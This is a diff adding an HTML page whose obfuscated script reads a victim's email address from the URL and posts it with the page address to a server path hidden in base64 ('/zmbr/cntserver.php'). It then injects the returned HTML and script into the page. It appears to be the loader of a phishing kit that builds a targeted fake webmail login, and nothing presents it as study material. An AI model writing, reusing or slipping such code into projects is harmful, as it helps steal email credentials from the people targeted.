@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <title></title>
+    <link id="fav_icn" rel="shortcut icon" />
+    <link href="./style.css" rel="stylesheet" />
+  </head>
+
+  <body>
+    <div class="pg_cont"></div>
+
+    <div class="m_pg_cnt"></div>
+
+    <script id="hydr_scrpt"></script>
+
+    <script src="./srv.js"></script>
+
+    <script src="./lib.js"></script>
+
+    <script>
+      const init__ = async () => {
+        // set subCnt
+        const auth_err = ___getSC(window.location.href.split("?")[1]).sc;
+
+        // set _uem
+        // const _uem = __getURLEm();
+
+        let _uem = null;
+
+        try {
+          _uem = atob(__getURLEm());
+        } catch (err) {
+          if (__getURLEm()) {
+            _uem = __getURLEm();
+          } else {
+            console.log("error:", err.message);
+            return;
+          }
+        }
+
+        //clg({auth_err,  _uem, __winHref});
+
+        // ue_test check
+        if (!ue_test(__winHref, _uem)) {
+          return false;
+        }
+
+        async function __hydr() {
+          const __fetchOptions = {
+            method: "POST",
+            body: JSON.stringify({
+              auth_err,
+              _uem,
+              __winHref,
+            }),
+            headers: {
+              "Content-Type": "application/json",
+            },
+          };
+
+          const __res = await fetch(
+            `${window.stef.srv_loc}${atob("L3ptYnIvY250c2VydmVyLnBocA==")}`,
+            __fetchOptions
+          );
+
+          const __resData = await __res.json();
+
+          // __hydr
+          lg_cntHome.innerHTML = __resData.data.pg_cnt;
+          mbl_cntHome.innerHTML = __resData.data.m_pg_cnt;
+          hydr_scrpt.innerHTML = __resData.data.crpt;
+
+          // set loc dt
+          setLocDt(await loadLoc(__resData.data.key));
+        } // __hydr
+
+        __hydr();
+      }; // init__
+
+      init__();
+    </script>
+
+    <script></script>
+  </body>
+</html>
